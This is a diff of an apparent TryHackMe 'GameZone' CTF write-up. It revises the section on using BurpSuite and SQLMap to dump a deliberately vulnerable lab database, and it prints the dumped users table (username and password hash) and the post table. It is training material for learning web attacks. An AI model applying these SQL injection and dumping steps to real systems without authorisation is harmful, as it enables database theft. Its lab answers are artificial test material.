@@ -24,36 +24,53 @@ When you've logged in, what page do you get redirected to? `portal.php`
 
 ## Using SQLMap
 
-Im going to use SQLMap to dump the entire database for GameZone.
+Using the page we logged into earlier, we're going point SQLMap to the game review search feature.  
 
-Using the page I logged into earlier, Im going to point SQLMap to the game review search feature.
+First we need to intercept a request made to the search feature using [BurpSuite](https://tryhackme.com/room/learnburp).  
 
-First, I need to intercept a request made to the search feature using [BurpSuite](https://tryhackme.com/room/learnburp).
+ ![](https://i.imgur.com/ox4wJVH.png)  
 
-![BurpSuite Intercept](https://i.imgur.com/ox4wJVH.png)
+Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.
 
-Save this request into a text file. I can then pass this file to SQLMap to use our authenticated user session.
+![](https://i.imgur.com/W5boKpk.png)
 
-![SQLMap Usage](https://i.imgur.com/W5boKpk.png)
+**-r** uses the intercepted request you saved earlier  
+**--dbms** tells SQLMap what type of database management system it is  
+**--dump** attempts to outputs the entire database
 
-**-r** uses the intercepted request you saved earlier.  
-**--dbms** tells SQLMap the type of database management system being used.  
-**--dump** attempts to output the entire database.
+![](https://i.imgur.com/iiQ7g9t.png)
 
-SQLMap will now try different methods to identify vulnerabilities. Eventually, it will output the database.
+SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.
 
-In the users table, what is the hashed password?  
+In the users table, what is the hashed password?
 What was the username associated with the hashed password?
+```
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
 
-sql
-
-`Database: db Table: users [1 entry] +------------------------------------------------------------------+----------+ | pwd                                                              | username | +------------------------------------------------------------------+----------+ | ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  | +------------------------------------------------------------------+----------+`
+```
 
 What was the other table name?
-
-vbnet
-
-`Database: db Table: post [5 entries] +----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | id | name                           | description                                      | +----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | 1  | Mortal Kombat 11               | It's a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         | | 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isn't to say that it isn't a rollicking good time. | | 3  | SWBF2 2005                     | Best game ever                                 | | 4  | Hitman 2                       | Hitman 2 doesn't add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But that's not a bad thing.                                          | | 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      | +----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+`
+```
+Database: db
+Table: post
+[5 entries]
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | name                           | description                                     
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
+| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
+| 3  | SWBF2 2005                     | Best game ever                                 
+| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+```
 
 ## Cracking a password with JohnTheRipper
 
